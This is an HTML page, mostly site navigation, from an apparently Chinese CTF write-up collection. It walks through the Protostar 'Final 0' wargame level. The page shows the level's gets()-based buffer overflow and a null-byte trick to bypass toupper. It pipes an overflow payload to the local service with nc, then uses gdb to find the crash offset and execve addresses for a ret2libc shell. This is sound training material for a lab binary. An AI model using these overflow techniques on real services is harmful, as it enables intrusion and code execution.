+        fanfie
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/jefferson_disk/" class="md-nav__link">
+        转轮机加密
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/code_modulate/" class="md-nav__link">
+        编码与调制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/ciscn_rsa/" class="md-nav__link">
+        CISCN - rsa
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/opisthocomus_hoazin/" class="md-nav__link">
+        opisthocomus-hoazin
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/stars_and_shapes/" class="md-nav__link">
+        Stars and Shapes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
+        He Thrusts His Fists Against the Post
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_13" type="checkbox" id="__nav_6_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_13">
+          PBCTF 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="PBCTF 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_13">
+          <span class="md-nav__icon md-icon"></span>
+          PBCTF 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/alkaloid_stream/" class="md-nav__link">
+        Alkaloid Stream
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/steroid_stream/" class="md-nav__link">
+        Steroid Stream
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/easyxor/" class="md-nav__link">
+        easyxor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/ustc_easy_rsa/" class="md-nav__link">
+        HackerGame - Easy RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/baby_mac/" class="md-nav__link">
+        Baby MAC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/noteasy03/" class="md-nav__link">
+        noteasy03
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/dealymaffs/" class="md-nav__link">
+        Dealymaffs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/weird_programmer/" class="md-nav__link">
+        Weird Programmer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/x_factor/" class="md-nav__link">
+        X Factor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/paiaiai/" class="md-nav__link">
+        P(ai)^3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/casino/" class="md-nav__link">
+        Casino
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/black_hole/" class="md-nav__link">
+        Black Hole
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/diophantine/" class="md-nav__link">
+        Diophantine
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_25" type="checkbox" id="__nav_6_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_25">
+          Google CTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Google CTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_25">
+          <span class="md-nav__icon md-icon"></span>
+          Google CTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/cycling/" class="md-nav__link">
+        Cycling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/maybe_someday/" class="md-nav__link">
+        Maybe Someday
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/dynamic_rsa/" class="md-nav__link">
+        Dynamic RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_27" type="checkbox" id="__nav_6_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_27">
+          corCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="corCTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_27">
+          <span class="md-nav__icon md-icon"></span>
+          corCTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/exchanged/" class="md-nav__link">
+        exchanged
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/leapfrog/" class="md-nav__link">
+        leapfrog
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          Blockchain
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Blockchain" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Blockchain
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/code_is_law/" class="md-nav__link">
+        Code is Law
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/totally_secure_dapp/" class="md-nav__link">
+        Totally Secure Dapp
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/cairo_reverse/" class="md-nav__link">
+        Cairo Reverse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tctf_nft_market/" class="md-nav__link">
+        TCTF NFT Market
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7_5">
+          DownUnderCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DownUnderCTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_7_5">
+          <span class="md-nav__icon md-icon"></span>
+          DownUnderCTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/secret_and_ephemeral/" class="md-nav__link">
+        Secret and Ephemeral
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/private_log/" class="md-nav__link">
+        Private Log
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Wargames
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Wargames" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Wargames
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../natas/" class="md-nav__link">
+        Natas
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../leviathan/" class="md-nav__link">
+        Leviathan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../krypton/" class="md-nav__link">
+        Krypton
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../narnia/" class="md-nav__link">
+        Narnia
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ethernaut/" class="md-nav__link">
+        Ethernaut
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_6" type="checkbox" id="__nav_8_6" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_6">
+          Protostar
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Protostar" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_6">
+          <span class="md-nav__icon md-icon"></span>
+          Protostar
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../stack/" class="md-nav__link">
+        Stack
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../format/" class="md-nav__link">
+        Format
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../heap/" class="md-nav__link">
+        Heap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net/" class="md-nav__link">
+        Net
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Final
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Final
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#final-0" class="md-nav__link">
+    Final 0
+  </a>
+  
+    <nav class="md-nav" aria-label="Final 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-1" class="md-nav__link">
+    Final 1
+  </a>
+  
+    <nav class="md-nav" aria-label="Final 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-2" class="md-nav__link">
+    Final 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Final 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          彩蛋
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="彩蛋" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          彩蛋
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_index/" class="md-nav__link">
+        CTFHub - 首页
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_wechat/" class="md-nav__link">
+        CTFHub - 公众号
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_tools/" class="md-nav__link">
+        CTFHub - 工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_match/" class="md-nav__link">
+        CTFHub - 赛事
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_exams/" class="md-nav__link">
+        CTFHub - 真题
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#final-0" class="md-nav__link">
+    Final 0
+  </a>
+  
+    <nav class="md-nav" aria-label="Final 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-1" class="md-nav__link">
+    Final 1
+  </a>
+  
+    <nav class="md-nav" aria-label="Final 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-2" class="md-nav__link">
+    Final 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Final 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+  
+
+  
+                
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/protostar/final.md" title="编辑此页" class="md-content__button md-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+
+  <h1>Final</h1>
+
+<blockquote>
+<p>The levels to be exploited can be found in the /opt/protostar/bin directory.</p>
+<p>The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p.</p>
+</blockquote>
+<h2 id="final-0">Final 0<a class="headerlink" href="#final-0" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>You may wish to use a toupper() proof shellcode</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="cp"></span>
+
+<span class="cp">#define NAME &quot;final0&quot;</span>
+<span class="cp">#define UID 0</span>
+<span class="cp">#define GID 0</span>
+<span class="cp">#define PORT 2995</span>
+
+<span class="cm">/*</span>
+<span class="cm"> * Read the username in from the network</span>
+<span class="cm"> */</span><span class="w"></span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">get_username</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"> </span><span class="c1">// reads a line from stdin into the buffer until either a terminating newline or EOF, which it replaces with &#39;\0&#39;</span>
+
+<span class="w">  </span><span class="cm">/* Strip off trailing new line characters */</span><span class="w"></span>
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Convert to lower case */</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">toupper</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Duplicate the string and return it */</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span><span class="w"></span>
+<span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w"> </span>
+
+<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span><span class="w"></span>
+<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_username</span><span class="p">();</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;No such user %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li><code>gets</code> 不处理 <code>\0</code>，而 <code>strlen</code> 通过 <code>\0</code> 来计算字符串的长度，因此可以通过前置 <code>\0</code> 来绕过 <code>toupper</code></li>
+<li>
+<p><code>Core files will be in /tmp</code> 核心转储文件（<code>man core</code>）</p>
+<blockquote>
+<p>The default action of <strong>certain signals</strong> is to cause a process to <strong>terminate</strong> and produce a core dump file, a disk file containing an image of the process's memory at the time of termination.</p>
+</blockquote>
+</li>
+<li>
+<p>常见 Signal 如下</p>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Action</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SIGINT</td>
+<td>Term</td>
+<td>Interrupt from keyboard</td>
+</tr>
+<tr>
+<td>SIGILL</td>
+<td>Core</td>
+<td>Illegal Instruction</td>
+</tr>
+<tr>
+<td>SIGSEGV</td>
+<td>Core</td>
+<td>Invalid memory reference</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p>首先通过缓冲区溢出来获得核心转储文件用于调试并确定溢出点</p>
+<div class="highlight"><pre><span></span><code>$ python -c <span class="s2">&quot;print &#39;a&#39;*512 + &#39;\x00&#39;*4 + &#39;aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll&#39;&quot;</span> <span class="p">|</span> nc localhost <span class="m">2995</span>
+$ ls /tmp/core*
+/tmp/core.11.final0.18906
+$ su root
+<span class="c1"># gdb final0 /tmp/core.11.final0.18906</span>
+Core was generated by <span class="sb">`</span>/opt/protostar/bin/final0<span class="sb">`</span>.
+Program terminated with signal <span class="m">11</span>, Segmentation fault.
+<span class="c1">#0  0x65656565 in ?? () # eeee</span>
+</code></pre></div>
+</li>
+<li>
+<p>也可以通过进程调试</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># gdb -p `pidof final0`</span>
+accept <span class="o">()</span> at ../sysdeps/unix/sysv/linux/i386/socket.S:64
+<span class="m">64</span>  <span class="k">in</span> ../sysdeps/unix/sysv/linux/i386/socket.S
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> follow-fork-mode child  <span class="c1"># 跟踪子进程</span>
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+<span class="o">[</span>New process <span class="m">19058</span><span class="o">]</span> <span class="c1"># another terminal sends the payload</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="o">[</span>Switching to process <span class="m">19058</span><span class="o">]</span>
+0x65656565 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div>
+</li>
+<li>
+<p>查看 ret2libc 函数地址</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># gdb -p `pidof final0`</span>
+accept <span class="o">()</span> at ../sysdeps/unix/sysv/linux/i386/socket.S:64
+<span class="m">64</span>  <span class="k">in</span> ../sysdeps/unix/sysv/linux/i386/socket.S
+<span class="o">(</span>gdb<span class="o">)</span> info functions @plt
+All functions matching regular expression <span class="s2">&quot;@plt&quot;</span>:
+
+Non-debugging symbols:
+0x080489fc  __errno_location@plt
+0x08048a0c  srand@plt
+0x08048a1c  open@plt
+...
+0x08048c0c  execve@plt
+...
+0xb7fe380c  ___tls_get_addr@plt
+0xb7fe381c  free@plt
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
+</code></pre></div>
+</li>
+<li>
+<p>观察如何构造栈来正确地调用 <code>execve()</code></p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// int execve(const char *filename, char *const argv[], char *const envp[]);</span>
+<span class="w">    </span><span class="c1">// no arguments and environment variables</span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$ gcc execve_example.c -o execve_example
+$ gdb ./execve_example
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disassemble main 
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
+0x080483c4 &lt;main+0&gt;:    push   ebp
+0x080483c5 &lt;main+1&gt;:    mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:    sub    esp,0x10
+0x080483cd &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x0
+0x080483d5 &lt;main+17&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x0
+0x080483dd &lt;main+25&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80484b0
+0x080483e4 &lt;main+32&gt;:   call   0x80482fc &lt;execve@plt&gt;
+0x080483e9 &lt;main+37&gt;:   leave  
+0x080483ea &lt;main+38&gt;:   ret    
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080483e4
+Breakpoint <span class="m">1</span> at 0x80483e4
+<span class="o">(</span>gdb<span class="o">)</span> r
+Starting program: /tmp/execve_example 
+
+Breakpoint <span class="m">1</span>, 0x080483e4 <span class="k">in</span> main <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> si
+0x080482fc <span class="k">in</span> execve@plt <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> x/8wx <span class="nv">$esp</span>
+0xbffff69c: 0x080483e9  0x080484b0  0x00000000  0x00000000
+0xbffff6ac: 0xb7fd7ff4  0x08048400  0x00000000  0xbffff738
+<span class="o">(</span>gdb<span class="o">)</span> x/2i 0x080483e9
+0x80483e9 &lt;main+37&gt;:    leave  
+0x80483ea &lt;main+38&gt;:    ret    
